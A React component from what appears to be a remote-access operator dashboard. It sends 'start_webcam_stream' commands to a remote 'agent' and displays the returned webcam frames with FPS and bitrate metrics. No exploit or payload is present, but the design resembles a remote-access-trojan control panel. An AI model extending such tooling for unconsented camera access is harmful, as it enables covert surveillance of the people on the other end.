import React, { useState, useEffect, useRef } from 'react';
import { Box, Button, Typography, IconButton } from '@mui/material';
import {
  Stop as StopIcon,
  Fullscreen as FullscreenIcon,
  CameraAlt as CameraAltIcon
} from '@mui/icons-material';
import { io } from 'socket.io-client';
import api from '../services/api';

const SOCKET_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000';

/* ---------------------------------------------------------------
   Graphite design tokens — keep in sync with StreamWindow.jsx
   --------------------------------------------------------------- */
const T = {
  bg:         '#0b0c0e',
  bgElevated: '#111316',
  panel:      '#15181c',
  panelRaised:'#1b1f24',
  panelHover: '#232830',
  border:     'rgba(255,255,255,0.06)',
  borderStrong:'rgba(255,255,255,0.10)',
  borderHi:   'rgba(255,255,255,0.18)',
  text:       '#eef1f4',
  textSoft:   '#c4c9d0',
  textDim:    '#8a929d',
  textMuted:  '#5a626d',
  ok:         '#b9c2cc',
  okSoft:     'rgba(185,194,204,0.10)',
  bad:        '#c98a8a',
  badSoft:    'rgba(201,138,138,0.10)',
  font:       '"Inter","Bahnschrift","Segoe UI",system-ui,sans-serif',
  mono:       '"JetBrains Mono","SF Mono",Menlo,ui-monospace,monospace',
};

const ghostBtn = {
  borderColor: T.borderStrong,
  color:       T.textSoft,
  bgcolor:     'transparent',
  fontFamily:  T.font,
  fontWeight:  500,
  fontSize:    '13px',
  textTransform:'none',
  borderRadius:'10px',
  px: 1.6, py: 0.8,
  '&:hover': {
    borderColor: T.borderHi,
    bgcolor:     T.panelHover,
    color:       T.text,
  },
};

const dangerBtn = {
  ...ghostBtn,
  color: T.bad,
  borderColor: 'rgba(201,138,138,0.30)',
  '&:hover': {
    bgcolor: T.badSoft,
    borderColor: 'rgba(201,138,138,0.55)',
    color: T.bad,
  },
};

const iconBtn = {
  color: T.textDim,
  border: `1px solid ${T.borderStrong}`,
  borderRadius: '10px',
  width: 36, height: 36,
  '&:hover': {
    borderColor: T.borderHi,
    color: T.text,
    bgcolor: T.panelHover,
  },
};

/* =============================================================
   WebcamStreamWindow
   ============================================================= */
export default function WebcamStreamWindow() {
  const [streaming, setStreaming] = useState(false);
  const [streamFrame, setStreamFrame] = useState(null);
  const [agentId, setAgentId] = useState(null);
  const [isFullscreen, setIsFullscreen] = useState(false);

  // Bitrate / FPS metrics
  const [fps, setFps]   = useState(0);
  const [kbps, setKbps] = useState(0);

  const streamingRef = useRef(false);
  const socketRef = useRef(null);
  const frameCountRef = useRef(0);
  const byteCountRef  = useRef(0);

  useEffect(() => { streamingRef.current = streaming; }, [streaming]);

  // FPS / Kbps tick
  useEffect(() => {
    const id = setInterval(() => {
      setFps(frameCountRef.current);
      setKbps(Math.round((byteCountRef.current * 8) / 1024));
      frameCountRef.current = 0;
      byteCountRef.current  = 0;
    }, 1000);
    return () => clearInterval(id);
  }, []);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const id = params.get('agentId');
    setAgentId(id);

    const token = localStorage.getItem('token');
    const socket = io(SOCKET_URL, {
      auth: { token },
      transports: ['websocket', 'polling']
    });

    socket.on('connect', () => {
      socket.emit('operator_connect', { token });
      if (id && !streamingRef.current) startWebcamStream(id);
    });

    socketRef.current = socket;

    const handleResult = (data) => {
      if (data.agent_id === parseInt(id)) {
        try {
          const parsed = JSON.parse(data.result);
          if (parsed.webcam_frame) {
            setStreamFrame(parsed.webcam_frame);
            frameCountRef.current += 1;
            byteCountRef.current  += Math.floor((parsed.webcam_frame.length * 3) / 4);
          }
        } catch (e) { /* not json */ }
      }
    };

    socket.on('command_result', handleResult);

    return () => {
      if (streamingRef.current && id) stopWebcamStream(id);
      socket.off('command_result', handleResult);
      socket.disconnect();
    };
  }, []);

  const startWebcamStream = (id) => {
    setStreaming(true);
    streamingRef.current = true;
    setStreamFrame(null);

    api.post(`/api/agents/${id}/command`, {
      command: 'start_webcam_stream',
      params: { interval: 0.2 }
    }).catch(err => {
      console.error('[WebcamStreamWindow] Error starting webcam stream:', err);
      setStreaming(false);
      streamingRef.current = false;
    });
  };

  const stopWebcamStream = (id) => {
    setStreaming(false);
    streamingRef.current = false;
    setStreamFrame(null);
    api.post(`/api/agents/${id}/command`, { command: 'stop_webcam_stream' })
      .catch(err => console.error('[WebcamStreamWindow] Error stopping webcam stream:', err));
  };

  const toggleFullscreen = () => {
    if (!document.fullscreenElement) {
      document.documentElement.requestFullscreen();
      setIsFullscreen(true);
    } else {
      document.exitFullscreen();
      setIsFullscreen(false);
    }
  };

  const StatusDot = ({ live }) => (
    <Box sx={{
      width: 6, height: 6, borderRadius: '50%',
      bgcolor: live ? T.ok : T.textMuted,
      boxShadow: live ? `0 0 0 3px ${T.okSoft}` : 'none',
      animation: live ? 'pulse-dot 2.4s ease-in-out infinite' : 'none',
      '@keyframes pulse-dot': {
        '0%,100%': { opacity: 1 },
        '50%':     { opacity: 0.45 }
      }
    }}/>
  );

  const Metric = ({ label, value, unit }) => (
    <Box sx={{
      display: 'flex', flexDirection: 'column', alignItems: 'flex-start',
      px: 1.4, py: 0.6,
      borderLeft: `1px solid ${T.border}`,
      minWidth: 70,
    }}>
      <Typography sx={{
        color: T.textMuted, fontSize: '9.5px', letterSpacing: '0.18em',
        textTransform: 'uppercase', fontFamily: T.font, lineHeight: 1,
      }}>{label}</Typography>
      <Box sx={{ display: 'flex', alignItems: 'baseline', gap: 0.5, mt: 0.5 }}>
        <Typography sx={{
          color: T.text, fontFamily: T.mono, fontSize: '13px',
          fontWeight: 600, lineHeight: 1, fontVariantNumeric: 'tabular-nums',
        }}>{value}</Typography>
        <Typography sx={{
          color: T.textMuted, fontFamily: T.mono, fontSize: '10px', lineHeight: 1,
        }}>{unit}</Typography>
      </Box>
    </Box>
  );

  return (
    <Box sx={{
      width: '100vw', height: '100vh',
      bgcolor: T.bg,
      display: 'flex', flexDirection: 'column',
      overflow: 'hidden', position: 'relative',
      fontFamily: T.font, color: T.text,
      '&::before': {
        content: '""', position: 'absolute', inset: 0,
        background: `radial-gradient(ellipse at 50% 0%, rgba(255,255,255,0.025), transparent 55%)`,
        pointerEvents: 'none',
      }
    }}>
      {/* Header */}
      <Box sx={{
        position: 'relative', zIndex: 10,
        px: 2.5, py: 1.5,
        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
        gap: 2, flexWrap: 'wrap',
        bgcolor: T.panel,
        borderBottom: `1px solid ${T.border}`,
        backdropFilter: 'blur(10px)',
      }}>
        <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, flexWrap: 'wrap' }}>
          <Box sx={{
            width: 32, height: 32, borderRadius: '8px',
            bgcolor: T.panelRaised, border: `1px solid ${T.borderStrong}`,
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            color: T.textDim,
          }}>
            <CameraAltIcon sx={{ fontSize: 16 }}/>
          </Box>
          <Box>
            <Typography sx={{
              color: T.textMuted, fontSize: '10px', letterSpacing: '0.18em',
              textTransform: 'uppercase', lineHeight: 1, mb: 0.4,
            }}>webcam stream</Typography>
            <Typography sx={{
              color: T.text, fontSize: '14px', fontWeight: 600, lineHeight: 1,
              letterSpacing: '-0.005em',
            }}>
              {agentId ? `Agent #${agentId}` : 'Disconnected'}
            </Typography>
          </Box>

          <Box sx={{
            display: 'inline-flex', alignItems: 'center', gap: 1,
            px: 1.2, height: 26, ml: 0.5,
            bgcolor: T.panelRaised, border: `1px solid ${T.borderStrong}`,
            borderRadius: '999px',
          }}>
            <StatusDot live={streaming && !!streamFrame}/>
            <Typography sx={{
              color: streaming && streamFrame ? T.text : T.textDim,
              fontSize: '10.5px', letterSpacing: '0.14em',
              textTransform: 'uppercase', fontFamily: T.font,
            }}>{streaming && streamFrame ? 'live' : (streaming ? 'syncing' : 'idle')}</Typography>
          </Box>

          {streaming && (
            <Box sx={{
              display: 'flex', alignItems: 'stretch', height: 36,
              bgcolor: T.panelRaised, border: `1px solid ${T.borderStrong}`,
              borderRadius: '10px', overflow: 'hidden', ml: 0.5,
            }}>
              <Metric label="fps"  value={fps}  unit=""    />
              <Metric label="rate" value={kbps} unit="kb/s"/>
            </Box>
          )}
        </Box>

        <Box sx={{ display: 'flex', gap: 1, alignItems: 'center' }}>
          <IconButton onClick={toggleFullscreen} title="Fullscreen" sx={iconBtn}>
            <FullscreenIcon sx={{ fontSize: 16 }}/>
          </IconButton>
          {streaming && (
            <Button
              variant="outlined"
              startIcon={<StopIcon sx={{ fontSize: 16 }}/>}
              onClick={() => stopWebcamStream(agentId)}
              sx={dangerBtn}
            >Stop</Button>
          )}
        </Box>
      </Box>

      {/* Stream Display */}
      <Box sx={{
        flex: 1, display: 'flex', alignItems: 'center', justifyContent: 'center',
        p: 3, overflow: 'hidden', position: 'relative',
      }}>
        {streamFrame ? (
          <Box sx={{
            position: 'relative',
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            p: isFullscreen ? 0 : '6px',
            bgcolor: isFullscreen ? 'transparent' : T.panel,
            border: isFullscreen ? 'none' : `1px solid ${T.border}`,
            borderRadius: isFullscreen ? 0 : '14px',
            boxShadow: isFullscreen ? 'none' : '0 20px 60px -20px rgba(0,0,0,0.7)',
            maxWidth: '100%', maxHeight: '100%',
          }}>
            <img
              src={`data:image/jpeg;base64,${streamFrame}`}
              alt="Webcam Stream"
              style={{
                display: 'block',
                maxWidth: '100%',
                maxHeight: isFullscreen ? '100vh' : 'calc(100vh - 140px)',
                objectFit: 'contain',
                borderRadius: isFullscreen ? 0 : '10px',
                border: isFullscreen ? 'none' : `1px solid ${T.border}`,
              }}
            />
            {!isFullscreen && (
              <Box sx={{
                position: 'absolute', top: 14, left: 14,
                display: 'inline-flex', alignItems: 'center', gap: 1,
                px: 1.2, height: 24,
                bgcolor: 'rgba(11,12,14,0.72)',
                border: `1px solid ${T.borderStrong}`,
                borderRadius: '999px',
                backdropFilter: 'blur(8px)',
              }}>
                <StatusDot live/>
                <Typography sx={{
                  color: T.text, fontSize: '10px', letterSpacing: '0.16em',
                  textTransform: 'uppercase', fontFamily: T.font,
                }}>cam</Typography>
                <Box sx={{ width: '1px', height: 10, bgcolor: T.border, mx: 0.5 }}/>
                <Typography sx={{
                  color: T.textSoft, fontFamily: T.mono, fontSize: '10.5px',
                  fontVariantNumeric: 'tabular-nums',
                }}>{fps} fps · {kbps} kb/s</Typography>
              </Box>
            )}
          </Box>
        ) : (
          <Box sx={{ textAlign: 'center' }}>
            <Box sx={{
              width: 56, height: 56, mx: 'auto', mb: 2,
              borderRadius: '14px',
              bgcolor: T.panel,
              border: `1px solid ${T.border}`,
              display: 'flex', alignItems: 'center', justifyContent: 'center',
              color: T.textDim,
            }}>
              <CameraAltIcon sx={{ fontSize: 22 }}/>
            </Box>
            <Typography sx={{
              color: T.textDim, fontSize: '12px',
              letterSpacing: '0.16em', textTransform: 'uppercase',
            }}>
              {streaming ? 'Waiting for webcam stream…' : 'Webcam stream not active'}
            </Typography>
          </Box>
        )}
      </Box>
    </Box>
  );
}
